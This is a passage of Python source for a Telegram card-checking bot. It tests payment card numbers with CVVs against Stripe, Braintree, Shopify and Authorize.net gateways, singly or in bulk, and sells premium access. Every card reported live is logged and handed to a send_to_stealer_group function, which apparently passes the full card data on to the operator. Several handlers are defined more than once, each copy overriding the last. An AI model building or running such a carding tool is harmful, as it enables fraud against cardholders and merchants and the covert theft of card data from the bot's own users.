    """Build unified Onichan gate response for inline gate handlers"""
    from modules.gate_checker import _onichan_format, _clean_response_msg
    result = {"status": "success", "message": message}
    return ae(_onichan_format(result, cc, mm, yy, cvv, bin_info, gate_display, elapsed, username))

async def check_gate(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_name: str, gate_display: str, require_prem: bool = False):
    """Generic gate checker"""
    user = update.effective_user
    
    # Check if banned
    if is_banned(user.id):
        gif_url = get_sexy_anime_gif("banned")
        await update.message.reply_animation(
            animation=gif_url,
            caption=ae("🚫 <b>YOU ARE BANNED!</b>\n\nYou cannot use this bot."),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if approved
    if not is_approved(user.id):
        await update.message.reply_text(
            "⏳ <b>Access Pending</b>\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval.\n\n"
            f"Contact: @{SUPPORT_USERNAME}",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check premium requirement
    if require_prem and not is_premium(user.id):
        gif_url = get_sexy_anime_gif("premium")
        await update.message.reply_animation(
            animation=gif_url,
            caption=get_premium_denied_message(user.id),
            parse_mode=ParseMode.HTML
        )
        return
    
    # Parse card
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/{gate_name} 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    # Send initial checking message
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: {gate_display}",
        parse_mode=ParseMode.HTML
    )
    
    # Animate checking progress
    import asyncio
    import time as time_module
    animations = [
        "⬜⬜⬜⬜⬜",
        "🟦⬜⬜⬜⬜",
        "🟦🟦⬜⬜⬜",
        "🟦🟦🟦⬜⬜",
        "🟦🟦🟦🟦⬜",
        "🟦🟦🟦🟦🟦"
    ]
    
    for i, anim in enumerate(animations):
        try:
            await checking_msg.edit_text(
                f"🎀 <b>Checking card...</b> {anim}\n\n"
                f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                f"Gateway: {gate_display}",
                parse_mode=ParseMode.HTML
            )
            await asyncio.sleep(0.3)
        except:
            pass
    
    # Check card using PHP gate (run in thread pool to avoid blocking event loop)
    start_time = time_module.time()
    result = await asyncio.to_thread(check_card_php, gate_name, cc, mm, yy, cvv, user.id)
    elapsed = time_module.time() - start_time
    
    # Format response
    response = ae(format_gate_response(result, gate_name, cc, mm, yy, cvv, user.username or user.first_name, elapsed))
    
    # Log approved cards and notify owner
    card_is_approved = False
    
    if result["status"] == "success":
        msg_lower = result["message"].lower()
        card_is_approved = "approved" in msg_lower or "success" in msg_lower or "valid" in msg_lower or "authorized" in msg_lower
        
        if card_is_approved:
            from modules.gate_checker import get_bin_info
            bin_info = get_bin_info(cc)
            
            # Log approved cards
            log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, gate_name, result["message"], bin_info)
            
            # Send to stealer group
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, gate_name, result["message"], bin_info, user.id, user.username or user.first_name)
            
            # Send result WITH GIF attached (not separate)
            try:
                success_gif = get_sexy_anime_gif("success")
                await update.message.reply_animation(
                    animation=success_gif,
                    caption=response,  # Full result attached to GIF
                    parse_mode=ParseMode.HTML
                )
                # Delete checking message
                try:
                    await checking_msg.delete()
                except:
                    pass
            except Exception:
                # Fallback: try without HTML parsing if there's an issue
                try:
                    import re
                    plain_response = re.sub(r'<[^>]+>', '', response)
                    await checking_msg.edit_text(plain_response)
                except:
                    await checking_msg.edit_text("Card checked - check result above")
            

        else:
            # Send result WITH declined GIF attached (not separate)
            try:
                failed_gif = get_sexy_anime_gif("failed")
                await update.message.reply_animation(
                    animation=failed_gif,
                    caption=response,  # Full result attached to GIF
                    parse_mode=ParseMode.HTML
                )
                # Delete checking message
                try:
                    await checking_msg.delete()
                except:
                    pass
            except Exception:
                # Fallback: try without HTML parsing if there's an issue
                try:
                    import re
                    plain_response = re.sub(r'<[^>]+>', '', response)
                    await checking_msg.edit_text(plain_response)
                except:
                    await checking_msg.edit_text("Card checked - see result")

# FREE GATES
@require_approval
async def gate_bu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree Auth $1"""
    await check_gate(update, context, "bu", "Braintree Auth $1", False)

@require_approval
async def gate_sq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Square Auth $0"""
    await check_gate(update, context, "sq", "Square Auth $0", False)

# PREMIUM GATES - PayPal (old ref, overridden below)
# gate_pp is defined later with the new PayPal $1 async checker

# PREMIUM GATES - Stripe
@require_premium
async def gate_sor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe $2"""
    await check_gate(update, context, "sor", "Stripe $2", True)

@require_premium
async def gate_st5(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe $5"""
    await check_gate(update, context, "st5", "Stripe $5", True)

@require_premium
async def gate_st12(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe $12"""
    await check_gate(update, context, "st12", "Stripe $12", True)

@require_premium
async def gate_dep(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe $49"""
    await check_gate(update, context, "dep", "Stripe $49", True)

# PREMIUM GATES - Authorize.net
@require_premium
async def gate_auz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorize.net $0"""
    await check_gate(update, context, "auz", "Authorize.net $0", True)

@require_premium
async def gate_asd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorize.net $7"""
    await check_gate(update, context, "asd", "Authorize.net $7", True)

@require_premium
async def gate_atf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorize.net $25"""
    await check_gate(update, context, "atf", "Authorize.net $25", True)

@require_premium
async def gate_anh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorize.net $200"""
    await check_gate(update, context, "anh", "Authorize.net $200", True)

# PREMIUM GATES - Shopify
@require_premium
async def gate_sh6(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shopify $6"""
    await check_gate(update, context, "sh6", "Shopify $6", True)

@require_premium
async def gate_sh8(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shopify $8"""
    await check_gate(update, context, "sh8", "Shopify $8", True)

@require_premium
async def gate_sh10(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shopify $10"""
    await check_gate(update, context, "sh10", "Shopify $10", True)

@require_premium
async def gate_sh13(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shopify $13"""
    await check_gate(update, context, "sh13", "Shopify $13", True)

# PREMIUM GATES - Braintree
@require_premium
async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree Checker"""
    await check_gate(update, context, "b3", "Braintree", True)

@require_premium
async def mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Braintree with 5 batches and 1s delay"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Braintree</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line. Max 50 cards.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_b3'] = True
        return
    
    cards_text = ' '.join(context.args)
    await process_mass_b3(update, context, cards_text)

async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Braintree check with 5 batches and 1s delay"""
    import asyncio
    from modules.gate_checker import check_braintree_gate, get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait for it to complete or use /stop to cancel it.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'b3'
    
    try:
        limit = get_mass_check_limit(user.id)
        
        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
        
        if not cards:
            await update.message.reply_text(ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        msg = await update.message.reply_text(
            f"🔄 <b>Mass Braintree Check Started</b>\n\n"
            f"📊 Cards: {len(cards)}\n"
            f"⚡ Gate: Braintree\n"
            f"🔄 Processing in 5 batches...",
            parse_mode=ParseMode.HTML
        )
        
        approved = []
        declined = []
        errors = []
        
        batch_size = max(1, len(cards) // 5)
        batches = [cards[i:i+batch_size] for i in range(0, len(cards), batch_size)]
        
        for batch_num, batch in enumerate(batches, 1):
            for card in batch:
                if context.user_data.get('mass_check_stop'):
                    break
                
                try:
                    loop = asyncio.get_running_loop()
                    result = await asyncio.wait_for(
                        loop.run_in_executor(None, check_braintree_gate, 
                                            card['cc'], card['mm'], card['yy'], card['cvv']),
                        timeout=8.0
                    )
                    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                    
                    if result['status'] == 'success':
                        if 'approved' in result['message'].lower():
                            approved.append(f"✅ {card_str}\n→ {result['message']}")
                        else:
                            declined.append(f"❌ {card_str}\n→ {result['message']}")
                    else:
                        errors.append(f"⚠️ {card_str}\n→ {result['message']}")
                except asyncio.TimeoutError:
                    errors.append(f"⚠️ {card['cc']}|...\n→ No Response (8s)")
                except Exception as e:
                    errors.append(f"⚠️ {card['cc']}|...\n→ Error: {str(e)[:30]}")
            
            progress_text = f"📊 <b>Mass Braintree Check</b>\n\n"
            progress_text += f"✅ Approved: {len(approved)}\n"
            progress_text += f"❌ Declined: {len(declined)}\n"
            progress_text += f"⚠️ Errors: {len(errors)}\n\n"
            progress_text += f"⏳ Processing batch {batch_num}/{len(batches)}..."
            
            try:
                await msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except:
                pass
            
            if context.user_data.get('mass_check_stop'):
                break
            
            if batch_num < len(batches):
                await asyncio.sleep(1)
        
        stopped = context.user_data.get('mass_check_stop', False)
        status_text = "STOPPED" if stopped else "Complete"
        
        result_text = f"📊 <b>Mass Braintree Check {status_text}</b>\n\n"
        result_text += f"✅ Approved: {len(approved)}\n"
        result_text += f"❌ Declined: {len(declined)}\n"
        result_text += f"⚠️ Errors: {len(errors)}\n\n"
        
        if approved:
            result_text += "<b>✅ APPROVED:</b>\n"
            for a in approved:
                result_text += f"<code>{a}</code>\n\n"
        
        if declined:
            result_text += "<b>❌ DECLINED:</b>\n"
            for d in declined:
                result_text += f"<code>{d}</code>\n\n"
        
        if errors:
            result_text += "<b>⚠️ ERRORS:</b>\n"
            for e in errors:
                result_text += f"<code>{e}</code>\n\n"
        
        try:
            await msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False

# BRAINTREE EXTERNAL API GATES
@require_premium
async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree checker using external API"""
    user = update.effective_user
    
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/b3 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: Braintree",
        parse_mode=ParseMode.HTML
    )
    
    from modules.braintree_gate import check_braintree
    result = await check_braintree(cc, mm, yy, cvv)
    
    from modules.gate_checker import get_bin_info
    bin_info = get_bin_info(cc)
    
    if result['status'] == 'APPROVED':
        log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "b3", result['message'], bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", result['message'], bin_info, user.id, user.username or user.first_name)
        
        response = f"""💜 <b>ONICHAN • BRAINTREE</b>
━━━━━━━━━━━━━━━━━━━━
✅ <b>APPROVED</b>
💳 <code>{cc}|{mm}|{yy}|{cvv}</code>
📋 {result['response']}
━━━━━━━━━━━━━━━━━━━━
💳 {bin_info.get('brand', 'N/A')} • {bin_info.get('type', 'N/A')}
🏦 {bin_info.get('bank', 'N/A')}
🌍 {bin_info.get('country', 'N/A')}
━━━━━━━━━━━━━━━━━━━━
👤 @{user.username or user.first_name}"""

        try:
            success_gif = get_sexy_anime_gif("success")
            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
    elif result['status'] == 'CCN':
        response = f"""💜 <b>ONICHAN • BRAINTREE</b>
━━━━━━━━━━━━━━━━━━━━
🔵 <b>CCN (3DS)</b>
💳 <code>{cc}|{mm}|{yy}|{cvv}</code>
📋 {result['response']}
━━━━━━━━━━━━━━━━━━━━
💳 {bin_info.get('brand', 'N/A')} • {bin_info.get('type', 'N/A')}
🏦 {bin_info.get('bank', 'N/A')}
🌍 {bin_info.get('country', 'N/A')}
━━━━━━━━━━━━━━━━━━━━
👤 @{user.username or user.first_name}"""

        try:
            success_gif = get_sexy_anime_gif("success")
            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
    else:
        response = f"""💜 <b>ONICHAN • BRAINTREE</b>
━━━━━━━━━━━━━━━━━━━━
❌ <b>DECLINED</b>
💳 <code>{cc}|{mm}|{yy}|{cvv}</code>
📋 {result['response']}
━━━━━━━━━━━━━━━━━━━━
💳 {bin_info.get('brand', 'N/A')} • {bin_info.get('type', 'N/A')}
🏦 {bin_info.get('bank', 'N/A')}
🌍 {bin_info.get('country', 'N/A')}
━━━━━━━━━━━━━━━━━━━━
👤 @{user.username or user.first_name}"""

        try:
            failed_gif = get_sexy_anime_gif("failed")
            await update.message.reply_animation(animation=failed_gif, caption=response, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)

@require_premium
async def mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Braintree with 5 batches and 1s delay"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Braintree</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_b3'] = True
        return
    
    cards_text = ' '.join(context.args)
    await process_mass_b3(update, context, cards_text)

async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Braintree check with 5 batches and 1s delay"""
    import asyncio
    from modules.braintree_gate import check_braintree
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait for it to complete or use /stop to cancel it.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'b3'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        
        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
        
        if not cards:
            await update.message.reply_text(ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        msg = await update.message.reply_text(
            f"🔄 <b>Mass Braintree Check Started</b>\n\n"
            f"📊 Cards: {len(cards)}\n"
            f"⚡ Gate: Braintree\n"
            f"🔄 Processing in 5 batches with 1s delay...",
            parse_mode=ParseMode.HTML
        )
        
        approved = []
        ccn = []
        declined = []
        errors = []
        
        batch_size = max(1, (len(cards) + 4) // 5)
        batches = [cards[i:i+batch_size] for i in range(0, len(cards), batch_size)]
        
        for batch_num, batch in enumerate(batches, 1):
            if context.user_data.get('mass_check_stop'):
                break
            
            for card in batch:
                if context.user_data.get('mass_check_stop'):
                    break
                
                try:
                    result = await asyncio.wait_for(
                        check_braintree(card['cc'], card['mm'], card['yy'], card['cvv']),
                        timeout=60.0
                    )
                    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                    
                    if result['status'] == 'APPROVED':
                        approved.append(f"✅ {card_str}\n→ {result['response']}")
                        bin_info = get_bin_info(card['cc'])
                        log_approved_card(user.id, user.username or user.first_name, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", result['message'], bin_info)
                        await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", result['message'], bin_info, user.id, user.username or user.first_name)
                        await send_approved_card_with_gif(update, card_str, "b3", result.get('message', 'Charged'), 3.0, bin_info)
                    elif result['status'] == 'CCN':
                        ccn.append(f"🔵 {card_str}\n→ {result['response']}")
                    elif result['status'] == 'DECLINED':
                        declined.append(f"❌ {card_str}\n→ {result['response']}")
                    else:
                        errors.append(f"⚠️ {card_str}\n→ {result['response']}")
                except asyncio.TimeoutError:
                    errors.append(f"⚠️ {card['cc']}|...\n→ Timeout (60s)")
                except Exception as e:
                    errors.append(f"⚠️ {card['cc']}|...\n→ Error: {str(e)[:30]}")
            
            progress_text = f"📊 <b>Mass Braintree Check</b>\n\n"
            progress_text += f"✅ Approved: {len(approved)}\n"
            progress_text += f"🔵 CCN: {len(ccn)}\n"
            progress_text += f"❌ Declined: {len(declined)}\n"
            progress_text += f"⚠️ Errors: {len(errors)}\n\n"
            progress_text += f"⏳ Processing batch {batch_num}/{len(batches)}..."
            
            try:
                await msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except:
                pass
            
            if batch_num < len(batches):
                await asyncio.sleep(1.0)
        
        stopped = context.user_data.get('mass_check_stop', False)
        status_text = "STOPPED" if stopped else "Complete"
        result_text = f"📊 <b>Mass Braintree Check {status_text}</b>\n\n"
        result_text += f"✅ Approved: {len(approved)}\n"
        result_text += f"🔵 CCN: {len(ccn)}\n"
        result_text += f"❌ Declined: {len(declined)}\n"
        result_text += f"⚠️ Errors: {len(errors)}\n\n"
        
        if approved:
            result_text += "<b>✅ APPROVED:</b>\n"
            for a in approved:
                result_text += f"<code>{a}</code>\n\n"
        
        if ccn:
            result_text += "<b>🔵 CCN:</b>\n"
            for c in ccn:
                result_text += f"<code>{c}</code>\n\n"
        
        if declined:
            result_text += "<b>❌ DECLINED:</b>\n"
            for d in declined:
                result_text += f"<code>{d}</code>\n\n"
        
        if errors:
            result_text += "<b>⚠️ ERRORS:</b>\n"
            for e in errors[:10]:
                result_text += f"<code>{e}</code>\n\n"
            if len(errors) > 10:
                result_text += f"<i>... and {len(errors) - 10} more errors</i>\n\n"
        
        try:
            await msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False

@require_premium
async def gate_bt1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree $1"""
    await check_gate(update, context, "bt1", "Braintree $1", True)

@require_premium
async def gate_bt3d(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree 3D"""
    await check_gate(update, context, "bt3d", "Braintree 3D", True)

# Braintree API Gate (vkrm.site)
@require_premium
async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree (vkrm API)"""
    import time
    from modules.bin_lookup import format_mass_card_result
    
    user = update.effective_user
    if not context.args:
        await update.message.reply_text(
            "💳 <b>Braintree Gate</b>\n\n"
            "Usage: <code>/b3 CC|MM|YY|CVV</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    card_text = context.args[0]
    parts = card_text.split('|')
    if len(parts) < 4:
        await update.message.reply_text(ae("❌ Invalid format. Use: CC|MM|YY|CVV"))
        return
    
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    
    msg = await update.message.reply_text(ae("⏳ Checking card..."))
    start = time.time()
    
    try:
        result = await check_b3(cc, mm, yy, cvv)
        elapsed = round(time.time() - start, 2)
        
        status = result.get('status', 'ERROR')
        response = result.get('response', 'Unknown')
        
        from modules.gate_checker import get_bin_info
        bin_info = get_bin_info(cc)
        
        if status in ['CHARGED', 'CCN']:
            log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "b3", response, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", response, bin_info, user.id, user.username or user.first_name)
            await msg.delete()
            await send_approved_card_with_gif(update, card_text, "b3", response, elapsed, bin_info)
        else:
            card_result = ae(format_mass_card_result(card_text, status, response, "Braintree", elapsed))
            await msg.edit_text(card_result, parse_mode=ParseMode.HTML)
    except Exception as e:
        await msg.edit_text(ae(f"❌ Error: {str(e)[:100]}"))

@require_premium
async def gate_mb3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Braintree check with 5 batches and 1s delay"""
    import time
    from modules.bin_lookup import format_mass_card_result
    
    user = update.effective_user
    user_id = user.id
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>Mass Braintree Check</b>\n\n"
            "Send cards: <code>/mb3 CC|MM|YY|CVV</code>\n"
            "One per line. Max 50 cards.\n"
            "5 parallel + 1s delay between batches.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_b3'] = True
        return
    
    cards_text = ' '.join(context.args)
    await process_mass_b3(update, context, cards_text)

async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Braintree check"""
    import time
    from modules.bin_lookup import format_mass_card_result
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(ae("⏳ Already running a mass check. Use /stop to cancel."))
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'b3'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        extracted = extract_cards_from_text(cards_text)
        cards = [f"{c[0]}|{c[1]}|{c[2]}|{c[3]}" for c in extracted]
        
        if not cards:
            await update.message.reply_text(ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        total = len(cards)
        approved = 0
        declined = 0
        
        header = await update.message.reply_text(
            f"🔄 <b>Mass Braintree Check</b>\n"
            f"Total: {total} | Batch: 5 | Delay: 1s\n"
            f"⏳ Processing...",
            parse_mode=ParseMode.HTML
        )
        
        results = await mass_check_b3(cards, batch_size=5, delay=1.0)
        
        for r in results:
            if context.user_data.get('mass_check_stop'):
                break
            
            card = r.get('card', '')
            status = r.get('status', 'ERROR')
            response = r.get('response', 'Unknown')
            
            if status in ['CHARGED', 'CCN']:
                approved += 1
                parts = card.split('|')
                if len(parts) >= 4:
                    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                    bin_info = get_bin_info(cc)
                    log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "b3", response, bin_info)
                    await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", response, bin_info, user.id, user.username or user.first_name)
                    await send_approved_card_with_gif(update, card, "b3", response, 0, bin_info)
            else:
                declined += 1
                card_result = ae(format_mass_card_result(card, status, response, "Braintree", 0))
                try:
                    await context.bot.send_message(
                        chat_id=update.message.chat_id,
                        text=card_result,
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
        
        await header.edit_text(
            f"✅ <b>Mass Braintree Complete</b>\n\n"
            f"📊 Total: {total}\n"
            f"✅ Approved: {approved}\n"
            f"❌ Declined: {declined}",
            parse_mode=ParseMode.HTML
        )
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False

# PREMIUM GATES - Auto Stripe Auth (newrp.vercel.app)
@require_premium
async def gate_ast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Auto Stripe Auth using newrp.vercel.app API"""
    user = update.effective_user
    
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/ast 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: Auto Stripe Auth",
        parse_mode=ParseMode.HTML
    )
    
    import time as time_module
    start_time = time_module.time()
    result = await check_ast(cc, mm, yy, cvv)
    elapsed = time_module.time() - start_time
    
    from modules.gate_checker import get_bin_info
    bin_info = get_bin_info(cc)
    
    status = result.get('status', 'ERROR')
    response = result.get('response', 'Unknown')
    
    username = user.username or user.first_name
    
    if status in ['CHARGED', 'CCN', 'LIVE']:
        log_approved_card(user.id, username, cc, mm, yy, cvv, "ast", response, bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "ast", response, bin_info, user.id, username)
        
        msg = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response}", "Auto Stripe Auth", bin_info, elapsed, username)
        
        try:
            gif_url = get_sexy_anime_gif("success")
            await update.message.reply_animation(animation=gif_url, caption=msg, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(msg, parse_mode=ParseMode.HTML)
    else:
        msg = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response}", "Auto Stripe Auth", bin_info, elapsed, username)
        
        try:
            gif_url = get_sexy_anime_gif("failed")
            await update.message.reply_animation(animation=gif_url, caption=msg, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(msg, parse_mode=ParseMode.HTML)

@require_premium
async def mass_ast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Auto Stripe Auth check with 5 parallel batches"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>Mass Auto Stripe Auth</b>\n\n"
            "Send cards: <code>/mast CC|MM|YY|CVV</code>\n"
            "One per line. Max 50 cards.\n"
            "5 parallel + 1s delay between batches.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_ast'] = True
        return
    
    cards_text = ' '.join(context.args)
    await process_mass_ast(update, context, cards_text)

async def process_mass_ast(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Auto Stripe Auth check"""
    import time
    from modules.bin_lookup import format_mass_card_result
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(ae("⏳ Already running a mass check. Use /stop to cancel."))
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'ast'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        extracted = extract_cards_from_text(cards_text)
        cards = [f"{c[0]}|{c[1]}|{c[2]}|{c[3]}" for c in extracted]
        
        if not cards:
            await update.message.reply_text(ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        total = len(cards)
        approved = 0
        declined = 0
        
        header = await update.message.reply_text(
            f"🔄 <b>Mass Auto Stripe Auth</b>\n"
            f"Total: {total} | Batch: 5 | Delay: 1s\n"
            f"⏳ Processing...",
            parse_mode=ParseMode.HTML
        )
        
        results = await mass_check_ast(cards, batch_size=5, delay=1.0)
        
        for r in results:
            if context.user_data.get('mass_check_stop'):
                break
            
            card = r.get('card', '')
            status = r.get('status', 'ERROR')
            response = r.get('response', 'Unknown')
            
            if status in ['CHARGED', 'CCN', 'LIVE']:
                approved += 1
                parts = card.split('|')
                if len(parts) >= 4:
                    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                    bin_info = get_bin_info(cc)
                    log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "ast", response, bin_info)
                    await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "ast", response, bin_info, user.id, user.username or user.first_name)
                    await send_approved_card_with_gif(update, card, "ast", response, 0, bin_info)
            else:
                declined += 1
                card_result = ae(format_mass_card_result(card, status, response, "Auto Stripe Auth", 0))
                try:
                    await context.bot.send_message(
                        chat_id=update.message.chat_id,
                        text=card_result,
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
        
        await header.edit_text(
            f"✅ <b>Mass Auto Stripe Auth Complete</b>\n\n"
            f"📊 Total: {total}\n"
            f"✅ Approved: {approved}\n"
            f"❌ Declined: {declined}",
            parse_mode=ParseMode.HTML
        )
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False

# PREMIUM GATES - Stripe NewRP Auth
@require_premium
async def gate_st(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe Auth (NewRP)"""
    await check_gate(update, context, "st", "Stripe Auth", True)

@require_premium
async def mass_st(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Stripe Auth with 5 parallel batches and 0.25s delay"""
